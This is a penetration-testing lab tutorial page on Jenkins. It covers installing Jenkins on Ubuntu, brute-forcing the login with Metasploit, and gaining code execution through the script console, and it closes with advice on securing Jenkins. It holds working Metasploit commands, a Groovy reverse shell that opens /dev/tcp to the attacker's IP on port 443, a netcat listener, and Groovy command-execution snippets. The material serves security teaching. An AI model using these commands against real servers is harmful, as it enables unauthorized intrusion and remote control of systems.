@@ -1,0 +1,361 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  font-family: "Lato", sans-serif;
+}
+
+.sidenav {
+  height: 100%;
+  width: 230px;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: #111;
+  overflow-x: hidden;
+  padding-top: 20px;
+}
+
+.main {
+        height: 100%;
+        width: 1020px;
+        position: scroll;
+        z-index: 1;
+        top: 0;
+        left: 0;
+        background-color: #fff;
+        overflow-x: scroll;
+        overflow-y: scroll;
+        padding-top: 0px;
+    }
+.sidenav a {
+  padding: 6px 8px 6px 16px;
+  text-decoration: none;
+  font-size: 15px;
+  color: white;
+  display: block;
+}
+
+.sidenav a:hover {
+  color: red;
+}
+
+.main {
+  margin-left: 240px; /* Same as the width of the sidenav */
+  font-size: 28px; /* Increased text to enable scrolling */
+  padding: 0px 10px;
+}
+
+@media screen and (max-height: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 18px;}
+}
+</style>
+</head>
+<body>
+<div class="sidenav">
+<a href="1.html">【🖳Apache Tomcat Penetration Testing🛠️👨🏽‍💻】</a>
+  <a href="2.html">【🖳Penetration Testing on MYSQL (Port 3306)🛠️👨🏽‍💻】</a>
+  <a href="3.html">【🖳Understanding HTTP Protocol🛠️👨🏽‍💻】</a>
+  <a href="4.html">【🖳Comprehensive Guide on Password Spraying Attack🛠️👨🏽‍💻】</a>
+ <a href="5.html">【🖳A Detailed Guide on Hydra Tool🛠️👨🏽‍💻】</a>
+  <a href="6.html">【🖳A Detailed Guide on Medusa Tool🛠️👨🏽‍💻】</a>
+  <a href="7.html">【🖳Comprehensive Guide on Local & Remote File Inclusion🛠️👨🏽‍💻】</a>
+<a href="8.html">【🖳Netcat for Pentesting🛠️👨🏽‍💻】</a>
+  <a href="9.html">【🖳Comprehensive Guide on Dirbuster & BurpSuite Spider Tools🛠️👨🏽‍💻】</a>
+  <a href="10.html">【🖳Jenkins Penetration Testing🛠️👨🏽‍💻】</a>
+ <p align="center"><img src="https://i.ibb.co/yyQbWbC/net.png" height="90" width="200"></p> 
+</div>
+<div class="main">
+<div class="markdown-heading" dir="auto">
+<h2 class="heading-element" dir="auto" tabindex="-1"><p align="left">🖳Jenkins Penetration Testing🛠️</p></h2>
+<div class="breadcrumbs-wrap">
+<div class="breadcrumb-trail breadcrumbs">
+<p><time class="entry-date published" datetime="2024-04-26T11:57:26+00:00"></time>Jenkins is an open-source automation server used for continuous integration (CI) and continuous delivery (CD). It&rsquo;s built on Java and utilizes a scripting platform for automation. Jenkins automates tasks such as building, testing, and deployment in the software development lifecycle. This automation accelerates development cycles, enhances code quality, and streamlines releases. Key features include CI/CD pipelines, automated testing, integration with version control systems, extensibility via plugins, and robust monitoring and reporting capabilities.</p>
+</div>
+</div>
+<div id="primary" class="col-md-8 content-area">
+<guide id="guide-28520" class="guide-28520 guide type-guide status-publish format-standard hentry category-penetration-testing">
+<div class="guide-wrap">
+<div class="guide-content">
+<div class="guide-date">&nbsp;</div>
+<div class="content guide-excerpt entry-content clearfix">
+<h3>Table of Contents</h3>
+<ul>
+<li>Lab Setup</li>
+<li>Installation</li>
+<li>Configuration</li>
+<li>Enumeration</li>
+<li>Exploitation using Metasploit Framework</li>
+<li>Exploiting Manually (Reverse Shell)</li>
+<li>Executing Shell Commands Directly</li>
+<li>Conclusion</li>
+</ul>
+<h3>Lab Setup</h3>
+<p>In this guide, we are going to setup the Jenkins server on the ubuntu machine and obtain the remote code execution. Following are the machines:</p>
+<p>Target Machine: Ubuntu (192.168.1.4)</p>
+<p>Attacker Machine: Kali Linux (192.168.1.7)</p>
+<h3>Installation</h3>
+<p>For Jenkins to function, it necessitates the Java Runtime Environment (JRE). In this guide, we&rsquo;ll utilize OpenJDK to establish the Java environment. OpenJDK&rsquo;s development kit incorporates JRE within its framework.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">apt install openjdk-</span><span class="enlighter-n1">11</span><span class="enlighter-text">-jdk</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_Vcq5wMjvrfu3QefUdgfcEKMzZ5_6yR9uscSrCGE7lu3ctLi7PnDe8WVeMCRT6FjxB6amqohbubXuND64DogEcavJiNmrVvht4-dy_ckLoMoxYE-KEe7FsVzZoYJqIM69Lf2pyNKUviUZZSaaZFd4ABaJdXcWERG5JckV1eF-yrEJyA5uZlQNPxLCOEG1/s16000/1.png" alt="" /></p>
+<p>At times, the default Ubuntu repository may lack the latest Jenkins version. Therefore, it is suggested opting for the project-maintained repository to access the most recent features and patches.</p>
+<p>To integrate the Jenkins repository into the Ubuntu system, adhere to the following:</p>
+<p>Begin by importing the GPG key to ensure package integrity.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">sudo curl -fsSL https:</span><span class="enlighter-c0">//pkg.jenkins.io/debian-stable/jenkins.io-2023.key | sudo tee /usr/share/keyrings/jenkins-keyring.asc &gt; /dev/null</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHlo0SVm2x3NtMdqprvCbFlFosTG6X4j2Zyg6noR7XEdEqfR9oflwgaKKi__KZgoyKdeLMh8VssHKEC1-R3ftiLv6How65bWYnQrnoMj0vMqtbWxMDPUoThh6pNCDA6izq1yFCCFk5KXwqEmQUJpeFOrLas_XfykVixovhYMVTMDIqX2UhULO_KsazZ6Dj/s16000/2.png" alt="" /></p>
+<p>Following that, incorporate the Jenkins repository and append the authentication key to the source list using the command provided below:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">sudo echo deb </span><span class="enlighter-g1">[</span><span class="enlighter-text">signed-by=/usr/share/keyrings/jenkins-keyring.</span><span class="enlighter-m3">asc</span><span class="enlighter-g1">]</span><span class="enlighter-text"> https:</span><span class="enlighter-c0">//pkg.jenkins.io/debian-stable binary/ | sudo tee /etc/apt/sources.list.d/jenkins.list &gt; /dev/null</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGjJrTW9uUxFc45zFK_9LCqb49prJm6y7pjiA5u2CmqtmyjtxYc0LHYrEzdIX-fMEwpHzLrS7Rwtd5I4OUKnggNyQeY_ep3_glaQPm6Shg76dVQ7KKjqaQNXG5SgdCI2fJ8bbPYpr0WzE8Hky8AEqJjE4rt_iCCnyXQLd_Sa720_EoEjCEcgxIt3PGcUQ0/s16000/3.png" alt="" /></p>
+<p>Now we can proceed with the Jenkins installation in the ubuntu machine.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">apt install jenkins</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRSn4FHcry7_16YVsEMwWKIq-vKrmQ2husLyInV9WRkgNagAtaTrzlbGAkH3nBbHmGt-w_19-jZR4Zky0J6gLB79xveXhSbJHcUwEBCWnbcQgU6HvGm6Sh18IYN5OLWClSw5VBHqTGRoGmTSJwUkW0s6GlVImhlri6JfFKGmH5yjDRumtKNNi0_e07w73Q/s16000/6.png" alt="" /></p>
+<p>After installation is complete, Jenkins can be started using the following command:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">systemctl start jenkins</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>Status can be checked using the following command:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">systemctl status jenkins</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt6-U0NIiw0EiuVxGc-ZdF1oMx1Db2YUjFugwtAyPfEl2aeCd4VuMRuOEIsI5G0eYNtsrV1aoA7Y8wVS0bZyiVS9-4v7U6_a63JpzK44TJ0aDQ72rAC3aAgIjwEl_0Iacxu2W11EZX9cLecohq_XVByAntLkEmVB179bVjN0NAKXtpzY-AOsLPfbJeQ3Jk/s16000/7.png" alt="" /></p>
+<h3>Configuration</h3>
+<p>guide installation, Jenkins can be configured to run smoothly. By checking the service running on port 8080, the Jenkins server requires an&nbsp;<strong>Administrator password</strong>.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhboR8Xcxv7G0H4JYZC9yUobTzn41H-wKPkNj9F0Ge6Pg1NHsntqeGyIeAQEoB-d5bkgRz03kKBTjXxYi5OZNF7d1u_ixR9VeyIodJr0TFHUUZzTam7e_bIfg8uZV39Ew9o_EA4h-oEQB7f9-X13a5Ixhyphenhyphend1BipABp9bqPqE2G3xLISQO251O2irpvER56S/s16000/8.png" alt="" /></p>
+<p>Password can be obtained by reading the content of the&nbsp;<strong>initialAdminPassword</strong>&nbsp;file.</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">cat /var/lib/Jenkins/secrets/initialAdminPassword</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYTMdMVLWZqZ4-y0mdWCh-K0aN09dpbXx9uO-7_pkeeLVwx-MaBPx20cjgkpFn106nVOXpJYN4_OIRiRex5aLQXOZ5OBSc17yOGzqsc6ui7G9fjuTXV0Uiv6BkyZ2kmmxmYcv-DEGACsuytd7cQlwYYTgT8q5xXdopRgD40oj6FPu0mef-qF0nfAY80k6a/s16000/9.png" alt="" /></p>
+<p>Select the&nbsp;<strong>Install suggested plugins</strong>&nbsp;to&nbsp;<strong>Customize Jenkins</strong>&nbsp;and proceed with the installation.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVFvRmOj59rxYoM4537MIn5F_FWf3P7ZN9yev5nOBGrWNZpZ68IZYrCQ5b01aXPBi2xe0D8H9tmYQvDovhslk6-gu6CkoZrRAzpZgpkXyJbeByY3KvV6x3UXZsXyR002nfP6SVm1uLDouJ2_ilY3M2u_8HBtyp_SIMaBwV3X84djMIK5VZztC_Jk9OCfYs/s16000/10.png" alt="" /></p>
+<p>The final step requires the creation of&nbsp;<strong>First Admin User</strong>&nbsp;username and password. Here we are using the username as&nbsp;<strong>raj</strong>&nbsp;and password as&nbsp;<strong>123</strong>.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOiqthgtf-u54nTXh3jtum-Qb92gnnUVYrAus0fDPJ0UGk1_wauoejplni389y5ZJ1OcdT8ZI2FxkyP2mtymyJBA3hJzoumh9vcTEt73utC4XLnAes3PFQ-NDhEBKpsjYAPDlC6xozBFWwl3X_xSSa5KAzyRe1PJBZP9oXTaXsVbmJM1bcvY4XlPL1cc1r/s16000/12.png" alt="" /></p>
+<p>Finally, entering the URL to access the Jenkins Server. The URL can be entered as&nbsp;http://127.0.0.1:8080/&nbsp;as we want to setup the server on the ubuntu machine.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDdMUNqrAeOjaiLVl7J5vBEYW76NUYtER2ZP9UF-0NX1BtX63M2eZMlPawT43AMIaER4lrUoAfNMXbNxHGYP9UXcFGV7ypb80kVCWQoTQKaEZ0oN63FjMPsG5hypQoSsD1lYx_CbwEQAxPNE8BqIWR_OOjpn8-c2rwzt1YDUOVEiCXl6eeS1oAxMM8Xx__/s16000/13.png" alt="" /></p>
+<h3>Enumeration</h3>
+<p>After successfully installing and configuring the Jenkins server, we can start the exploitation using the kali machine. Starting with the enumeration, since at port 8080 the Jenkins Server is running in the ubuntu machine hence checking the port 8080. At port 8080 there is a Jenkins login page which requires credentials.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjec6Xz-Rdm823uVHkqgKgK6dZQnwRq8c28Ub1xKZKY3cv4FUV3z-b1bTQHD7ffSeMYDNLsobU0dP1cK974FC3APuHzTaS8yC_9kLDsuvLtGrfPQBoXvCaa_ggHmV39zwsSmnpW0l7Bdjc2k9T73qm1Ol4SebXIK1VIJnnTE5vIuwVS6QKZ1vUs7UC4bH-k/s16000/49.png" alt="" /></p>
+<h3>Exploitation using Metasploit Framework:</h3>
+<p>Since the login page requires credentials, hence we can use the auxiliary available in the Metasploit framework to check for the valid username and password to login. The auxiliary which we will be using will require a&nbsp;<strong>username&nbsp;</strong>file and a&nbsp;<strong>password</strong>&nbsp;file.</p>
+<p>It can be noted that for CTF scenarios the username file can be used as the common usernames list (https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt)&nbsp; and password file can be used as&nbsp;<strong>rockyou.txt</strong>. However, here we are using a custom dictionary to make the scanning easier. The following commands can be used inside Metasploit framework:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">use auxiliary/scanner/http/jenkins_login</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set rhosts </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">4</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set rport </span><span class="enlighter-n1">8080</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set targeturi /</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set user_file users.</span><span class="enlighter-m3">txt</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set pass_file passwords.</span><span class="enlighter-m3">txt</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set verbose </span><span class="enlighter-k1">false</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">exploit</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhW9Ah_5knCbmrKK4gneJb7FHo_hB1WTH7MZMj0jB3HUobU0gm3QcM5lIyL95cMvfzgXUQ4xroE2c-KJukd1L6WT6UCjNj-7vvi-G-qt0LCkdlGPCs37ZBHxcVO5RffbC9uzpzkuZk83YMo2DvznRwP8his-OsOUlrHL4i_aHSpettQTcL6DAk1j4SY5eAh/s16000/50.png" alt="" /></p>
+<p>Observe that the username and password have been enumerated successfully. After the username and password have been enumerated, now its time use them to exploit the target. The exploit which can be used here is the&nbsp;<strong>exploit/multi/http/Jenkins_script_console</strong>. Following commands can be used inside Metasploit framework to run the exploit:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">use exploit/multi/http/jenkins_script_console</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">show targets</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set target </span><span class="enlighter-n1">1</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set payload linux/x64/meterpreter/reverse_tcp</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set rhosts </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">4</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set rport </span><span class="enlighter-n1">8080</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set targeturi /</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set username raj</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">set password </span><span class="enlighter-n1">123</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">exploit</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQeXC9MMl0BIpYHmXTr4Dow5ln3mT-6tB74cBxZW3OzqHpAfXSAgBGTZ1VHreaRdxXe7ubzGbUD3BNj1iICr__wLWmdUngIvgUiu262384xqhLDSZBLUywcQWtlSDOhyphenhyphenWPlNUCiqGrh4r9sMpXuJ6nSEBU3crPK4CiOYZRavB_lHnfgxjhL_g-CZ5Pft4f/s16000/51.png" alt="" /></p>
+<p>Observe that the reverse shell has been obtained after the exploit has been successfully executed.</p>
+<h3>Exploiting Manually (Reverse Shell)</h3>
+<p>To exploit manually, we require the username and password of the Jenkins Console. Assuming here that the attacker has already found the credentials either by brute forcing or through any other method, successful login into the console can be performed.</p>
+<p>After login using the previously found credentials (<strong>raj</strong>:<strong>123</strong>) from the auxiliary. The&nbsp;<strong>Manage Jenkins</strong>&nbsp;functionality can be accessed which contains a&nbsp;<strong>Script Console</strong>&nbsp;functionality.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4uTLRSX9Tuax4L06MN5FavZyRklHbQzgB1AekXs46cV2nvM1t_GO5M3Rqbgypyp7wcN70J7pCHals8f7TVy6cA5-g1UoTNwePzPyNWwN-qXdydfw7khhxvuM_MjI470yulE9s6S2YPXsVnKqNVRtQRgUIty1gQaFyiPdpzi6A5j2jmG8GHAy_MFI2i_lR/s16000/52.png" alt="" /></p>
+<p>In Jenkins,&nbsp;<strong>Groovy</strong>&nbsp;serves as the main scripting language for defining jobs and pipelines. Groovy, being dynamic and operating on the Java Virtual Machine (JVM), seamlessly integrates with Jenkins, which is predominantly Java-based. &nbsp;Therefore, we are going to use the groovy reverse shell script to obtain the reverse shell. The command for the&nbsp;<strong>groovy reverse shell</strong>&nbsp;can be obtained from the following URL:&nbsp;https://www.revshells.com&nbsp;and selecting the Groovy script payload.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKflPb9vN1oF70pm4wrMrTEjdqhF4Wb6U9LHnze50csrpuM0mveeNaRlrz7G5jw8rT82oTGVcajXtFo67CTSB4PjDGlA5XM_EIsye2QHBUg44mHqUm3CtvevabfCeMsvS0rHzYLifnEu1QJiV5adAyxudKsE9KuUpTbet2Fdwj_FUC9zucU4qPJJFyhUfO/s16000/53.png" alt="" /></p>
+<p>Now, using the above groovy reverse shell script in the Jenkins script console. Before running the script make sure to start the&nbsp;<strong>netcat listener</strong>&nbsp;at port 443 inside kali machine using the following command:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">rlwrap nc -lnvp </span><span class="enlighter-n1">443</span></div>
+</div>
+</div>
+</div>
+</div>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE7q1GOw1zqsArZU99_3wyDoQOH3rZ_RiKkPozCalt1ougiRoFybwkntmKSg5mVCeM_T7tlm3vkwb0Fd1-M68G7NekP_E8UISd-PUpViQ-kfxTo0e92MpUch7quPA6isAU0Hy7FbZ0QGApllC_tlzuQhmkUgR4Xkd7KOmaEoYEdXVy5oSjxmBhIrghzQHU/s16000/54.png" alt="" /></p>
+<p>Finally, the reverse shell is obtained at port 443 after running the above groovy script.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhoEmTZTk72b4-zC_OKVCM_ZRjlvpUAEjw5ZU3HfSBJ4SODeJxrbk4iW33RJxki7amDvSpye5zkKpzE8iJFd-7aO4VW5K4T_TOKUWLSxajDIfbWOVFBSykrVuYZbrdg0p256WNqZBTnqTMLYvODlWzNOv1Uq0hD0nn5tQgqCAI5Ve6oLeEkQ68jLHFr9EVG/s16000/55.png" alt="" /></p>
+<p>An alternate way to get the reverse shell can be by running the following script in the script console:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">r = Runtime.</span><span class="enlighter-m3">getRuntime</span><span class="enlighter-g1">()</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">p = r.</span><span class="enlighter-m3">exec</span><span class="enlighter-g1">([</span><span class="enlighter-s0">"/bin/bash"</span><span class="enlighter-text">, </span><span class="enlighter-s0">"-c"</span><span class="enlighter-text">, </span><span class="enlighter-s0">"exec 5&lt;&gt;/dev/tcp/192.168.1.7/443; cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="enlighter-g1">]</span><span class="enlighter-text"> as String</span><span class="enlighter-g1">[])</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">p.</span><span class="enlighter-m3">waitFor</span><span class="enlighter-g1">()</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>Make sure to start the listener at port 443 before running the script.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSky7JuvIsyW8AkpqY_YBFvRJRwup_3vnZGDsqeh6LhxDOOFWoZGhOOGzobsrmVehr1Fh3agIwbuzMmvCcM8ACvMBAS2l5alLdsdgOamvm1g_ab3BR7LuXrhPi3N0tzAGi8cK1nS13CUSeaGgcEIoxTeiIVdUC8Nhxh_CxKoCAyfBLELv8oLkpAEQe6oDH/s16000/57.png" alt="" /></p>
+<p>Observe that the reverse shell is obtained at port 443 after the execution of the script.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBj_RwJ8Ee_X-s43Ee_cRflLu1vprvZyujTPHn_mwFSesnZdexpz9m8_m9zqh2Ffq2EMea2IelDxLdk_-qX-CYh_al3JaoKQkiswSHvpEjdLaJD_hfCebxR3tdWOI11cJWMXa47oWZ8xyIKhA8VFlLv7DthVSAbCLHCkRlFRUM9Gjcm2NEqXpbLdcQmqBU/s16000/58.png" alt="" /></p>
+<h3>Executing Shell Commands Directly</h3>
+<p>There are cases where we don&rsquo;t have a listener to take the reverse shell. In those cases, we can directly run the script and obtain the output of the code in the&nbsp;<strong>Result</strong>&nbsp;window.</p>
+<p>The following code is used to get the output of the system commands:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-k1">def</span><span class="enlighter-text"> sout = </span><span class="enlighter-k1">new</span> <span class="enlighter-m0">StringBuffer</span><span class="enlighter-g1">()</span><span class="enlighter-text">, serr = </span><span class="enlighter-k1">new</span> <span class="enlighter-m0">StringBuffer</span><span class="enlighter-g1">()</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-k1">def</span><span class="enlighter-text"> proc = </span><span class="enlighter-s0">'ipconfig'</span><span class="enlighter-text">.</span><span class="enlighter-m1">execute</span><span class="enlighter-g1">()</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">proc.</span><span class="enlighter-m3">consumeProcessOutput</span><span class="enlighter-g1">(</span><span class="enlighter-text">sout, serr</span><span class="enlighter-g1">)</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">proc.</span><span class="enlighter-m3">waitForOrKill</span><span class="enlighter-g1">(</span><span class="enlighter-n1">1000</span><span class="enlighter-g1">)</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">println </span><span class="enlighter-s0">"out&gt; $sout err&gt; $serr"</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>Observe that after running the script the output can be seen directly in the&nbsp;<strong>Result</strong>&nbsp;window.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHtXpu0Q0Xo1Izk0PmK734uA41A4QDkss_zgpTh7JEC9Y-O60yFVGC1X2Jw0OONkRWQF9BLvfKnNdHUwXNmBbln9No-NTzZ1OU6z3sgH3PhhRx6QZi6eGHX554pdEK9NcVEq18EQluz3yFdoTk-MLMbPFp0jjrn0agmEh8dBYIE8yAtM-LUe1cBbabhym0/s16000/59.png" alt="" /></p>
+<p>A similar code which can be used to get the command output in the Result window can be:</p>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-k1">def</span><span class="enlighter-text"> proc = </span><span class="enlighter-s0">"id"</span><span class="enlighter-text">.</span><span class="enlighter-m1">execute</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-k1">def</span><span class="enlighter-text"> os = </span><span class="enlighter-k1">new</span> <span class="enlighter-m0">StringBuffer</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">proc.</span><span class="enlighter-m3">waitForProcessOutput</span><span class="enlighter-g1">(</span><span class="enlighter-text">os, System.</span><span class="enlighter-m3">err</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-m0">println</span><span class="enlighter-g1">(</span><span class="enlighter-text">os.</span><span class="enlighter-m3">toString</span><span class="enlighter-g1">())</span><span class="enlighter-text">;</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>Observe that after running the script the output can be seen directly in the&nbsp;<strong>Result</strong>&nbsp;window.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCMsWEKEULCOirPIMJP2T4qnCrFs6fE477TBIXKAaFkewlI67ap3sKSglQWQfXcG9uoATysLTg5Ozj0EIUANxYMhNCd1M33AbfUbgqna0UwO9w01t-xe4Roj7_MNlJBmQZNbDoNS9MmEzrBOemggxrdJQAjhJJNs4-GPJ3w0Tt-ns13CHUSvah2XrJpfAl/s16000/60.png" alt="" /></p>
+<h3>Conclusion</h3>
+<p>In summary, the possibility of using Jenkins servers to gain a reverse shell emphasizes the crucial need for strong security practices. Whether due to compromised logins or no authentication at all, the vulnerability of Jenkins servers shows why we must take security seriously. It&rsquo;s essential for organizations to enforce strict access rules, conduct regular security checks, and promptly update systems to reduce the chances of unauthorized access and misuse.</p>
+</div>
+</div>
+</div>
+</guide>
+</div>
+</div>
+</div>
+</body>
+</html>
